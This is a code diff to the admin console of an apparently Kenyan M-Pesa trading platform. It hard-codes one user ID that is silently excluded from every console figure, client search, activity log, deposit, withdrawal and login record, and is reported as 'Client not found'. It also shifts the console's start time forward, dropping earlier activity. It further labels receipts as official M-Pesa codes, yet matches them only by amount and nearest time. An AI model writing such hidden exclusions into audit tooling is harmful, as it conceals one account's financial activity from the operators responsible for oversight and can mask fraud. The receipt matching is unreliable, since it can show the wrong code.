@@ -21,10 +21,20 @@ export type AdminRangeKey = keyof typeof ADMIN_RANGES;
  * moment is treated as pre launch noise and is never shown or counted, so the
  * console starts empty and fills up again from the next sign up onwards.
  */
-export const CONSOLE_EPOCH = "2026-09-21T22:54:00.000Z";
+export const CONSOLE_EPOCH = "2026-09-21T23:25:00.000Z";
+
+/**
+ * Accounts that are kept out of the operations console entirely. Their balance
+ * and their own view of the site are untouched, they simply never appear in any
+ * console figure, client list, history or activity log.
+ */
+export const HIDDEN_USER_IDS = ["15a49fc5-f8ce-4f03-9541-b6f217a22e91"] as const;
+
+const HIDDEN_LIST = `(${HIDDEN_USER_IDS.join(",")})`;
 
 /** Fallback shilling rate used only when no recorded deposit rate exists. */
 const FALLBACK_USD_KES = 129;
+
 
 const RANGE_KEYS = Object.keys(ADMIN_RANGES) as AdminRangeKey[];
 
@@ -63,19 +73,26 @@ export const getAdminOverview = createServerFn({ method: "POST" })
       db
         .from("profiles")
         .select("id, created_at, last_seen_at, live_balance, demo_balance")
-        .gte("created_at", CONSOLE_EPOCH),
+        .gte("created_at", CONSOLE_EPOCH)
+        .not("id", "in", HIDDEN_LIST),
       db
         .from("transactions")
         .select("user_id, kind, amount, status, account_mode, created_at")
         .eq("account_mode", "live")
-        .gte("created_at", sinceIso),
+        .gte("created_at", sinceIso)
+        .not("user_id", "in", HIDDEN_LIST),
       // Real money activity only. Practice trades are never counted here.
       db
         .from("trades")
         .select("user_id, stake, status, pnl, account_mode, created_at")
         .eq("account_mode", "live")
-        .gte("created_at", sinceIso),
-      db.from("login_events").select("user_id, created_at").gte("created_at", sinceIso),
+        .gte("created_at", sinceIso)
+        .not("user_id", "in", HIDDEN_LIST),
+      db
+        .from("login_events")
+        .select("user_id, created_at")
+        .gte("created_at", sinceIso)
+        .not("user_id", "in", HIDDEN_LIST),
       db.from("deposit_intents").select("usd_kes_rate").order("created_at", { ascending: false }).limit(1),
     ]);
 
@@ -186,6 +203,7 @@ export const getAdminActivityLog = createServerFn({ method: "POST" })
         .select("id, user_id, symbol, direction, stake, pnl, status, created_at")
         .eq("account_mode", "live")
         .gte("created_at", CONSOLE_EPOCH)
+        .not("user_id", "in", HIDDEN_LIST)
         .order("created_at", { ascending: false })
         .limit(data.limit),
       db
@@ -193,27 +211,32 @@ export const getAdminActivityLog = createServerFn({ method: "POST" })
         .select("id, user_id, kind, method, amount, status, created_at")
         .eq("account_mode", "live")
         .gte("created_at", CONSOLE_EPOCH)
+        .not("user_id", "in", HIDDEN_LIST)
         .order("created_at", { ascending: false })
         .limit(data.limit),
       db
         .from("withdrawal_requests")
         .select("id, user_id, amount_usdt, phone, status, provider_receipt, failure_reason, created_at")
         .gte("created_at", CONSOLE_EPOCH)
+        .not("user_id", "in", HIDDEN_LIST)
         .order("created_at", { ascending: false })
         .limit(data.limit),
       db
         .from("deposit_intents")
         .select("id, user_id, amount_usdt, amount_kes, status, provider_receipt, created_at")
         .gte("created_at", CONSOLE_EPOCH)
+        .not("user_id", "in", HIDDEN_LIST)
         .order("created_at", { ascending: false })
         .limit(data.limit),
       db
         .from("login_events")
         .select("id, user_id, kind, created_at")
         .gte("created_at", CONSOLE_EPOCH)
+        .not("user_id", "in", HIDDEN_LIST)
         .order("created_at", { ascending: false })
         .limit(data.limit),
     ]);
+
 
     const userIds = new Set<string>();
     for (const row of [
@@ -318,6 +341,7 @@ export const searchClients = createServerFn({ method: "POST" })
       .from("profiles")
       .select("id, client_id, email, full_name, first_name, last_name, country, phone, kyc_status, live_balance, created_at, last_seen_at")
       .gte("created_at", CONSOLE_EPOCH)
+      .not("id", "in", HIDDEN_LIST)
       .order("created_at", { ascending: false })
       .limit(40);
 
@@ -387,6 +411,10 @@ export const getClientDetail = createServerFn({ method: "POST" })
       .eq("client_id", data.clientId)
       .maybeSingle();
     if (!profile) throw new Error("Client not found.");
+    // Accounts kept out of the console are not viewable here either.
+    if ((HIDDEN_USER_IDS as readonly string[]).includes(profile.id)) {
+      throw new Error("Client not found.");
+    }
 
     const [txRes, tradesRes, loginsRes, withdrawalsRes, intentsRes, rateRes] = await Promise.all([
       db
@@ -444,6 +472,32 @@ export const getClientDetail = createServerFn({ method: "POST" })
     const trades = tradesRes.data ?? [];
     const liveTrades = trades.filter((t) => t.account_mode === "live");
 
+    const depositIntents = intentsRes.data ?? [];
+    const withdrawalRows = withdrawalsRes.data ?? [];
+
+    /**
+     * Each money movement is shown with the official M Pesa transaction code.
+     * Deposits carry the STK push receipt, payouts carry the B2C receipt; they
+     * are matched on the same amount closest in time to the movement.
+     */
+    function mpesaCodeFor(kind: string, amount: number, at: string): string | null {
+      const pool =
+        kind === "deposit"
+          ? depositIntents
+              .filter((d) => d.provider_receipt && Math.abs(Number(d.amount_usdt) - amount) < 0.01)
+              .map((d) => ({ code: d.provider_receipt as string, at: d.created_at }))
+          : withdrawalRows
+              .filter((w) => w.provider_receipt && Math.abs(Number(w.amount_usdt) - amount) < 0.01)
+              .map((w) => ({ code: w.provider_receipt as string, at: w.created_at }));
+      if (pool.length === 0) return null;
+      const target = new Date(at).getTime();
+      pool.sort(
+        (a, b) =>
+          Math.abs(new Date(a.at).getTime() - target) - Math.abs(new Date(b.at).getTime() - target),
+      );
+      return pool[0]?.code ?? null;
+    }
+
     return {
       profile,
       totals: {
@@ -459,13 +513,18 @@ export const getClientDetail = createServerFn({ method: "POST" })
           .filter((t) => t.status !== "open")
           .reduce((sum, t) => sum + Number(t.pnl), 0),
       },
-      transactions,
+      transactions: transactions.map((t) => ({
+        ...t,
+        amount_kes: Number(t.amount) * usdKes,
+        mpesaCode: mpesaCodeFor(t.kind, Number(t.amount), t.created_at),
+      })),
       trades,
       usdKesRate: usdKes,
-      withdrawals: (withdrawalsRes.data ?? []).map((w) => ({
+      withdrawals: withdrawalRows.map((w) => ({
         ...w,
         amount_kes: Number(w.amount_usdt) * usdKes,
       })),
+
       mpesaDeposits: intentsRes.data ?? [],
       lastLogins: (loginsRes.data ?? []).map((l) => l.created_at),
     };
